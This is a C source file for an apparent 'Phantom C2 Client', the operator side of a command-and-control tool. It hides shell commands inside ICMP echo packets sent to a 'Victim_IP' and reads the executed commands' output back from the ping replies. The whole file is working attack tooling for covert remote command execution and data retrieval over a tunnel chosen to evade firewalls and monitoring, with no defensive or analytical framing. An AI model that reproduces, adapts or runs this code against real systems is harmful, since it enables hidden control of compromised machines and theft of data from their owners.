/*
 * Phantom C2 Client
 * Sends commands via ICMP and retrieves output
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/time.h>

#define PAYLOAD_SIZE 1024

// Checksum Calculation
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Function to send ICMP packet and optionally wait for reply
void send_icmp(char *target_ip, char *data, int wait_reply) {
    int sockfd;
    struct sockaddr_in dest_addr;
    char packet[sizeof(struct icmphdr) + PAYLOAD_SIZE];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    
    // Create Raw Socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("[-] Socket Error (Run as root?)");
        exit(1);
    }

    struct timeval tv;
    tv.tv_sec = 2; 
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    memset(packet, 0, sizeof(packet));
    
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(1337);
    icmp->un.echo.sequence = htons(1);

    memset(packet + sizeof(struct icmphdr), 0, PAYLOAD_SIZE);
    memcpy(packet + sizeof(struct icmphdr), data, strlen(data));

    icmp->checksum = checksum(packet, sizeof(packet));

    sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if (wait_reply) {
        char recv_buf[2048];
        struct sockaddr_in src_addr;
        socklen_t src_len = sizeof(src_addr);
        
        int bytes = recvfrom(sockfd, recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&src_addr, &src_len);
        
        if (bytes > 0) {
            struct iphdr *ip = (struct iphdr *)recv_buf;
            struct icmphdr *icmp_reply = (struct icmphdr *)(recv_buf + (ip->ihl * 4));
            char *reply_data = (char *)icmp_reply + sizeof(struct icmphdr);
            
            printf("\n[+] --- VICTIM RESPONSE ---\n");
            if (reply_data[0] != 0) {
                printf("%s\n", reply_data);
            } else {
                printf("(No data returned)\n");
            }
            printf("[+] -----------------------\n");
        } else {
            printf("[-] No response received (Timeout).\n");
        }
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Victim_IP> <Command>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *cmd = argv[2];
    char cmd_payload[256];

    // 1. Send Command
    printf("[*] Sending Command: %s\n", cmd);
    snprintf(cmd_payload, 256, "cmd:%s", cmd);
    send_icmp(target_ip, cmd_payload, 0); 

    // 2. Wait for execution
    printf("[*] Waiting for execution...\n");
    sleep(1);

    // 3. Retrieve Result
    printf("[*] Fetching result...\n");
    send_icmp(target_ip, "get:", 1); 

    return 0;
}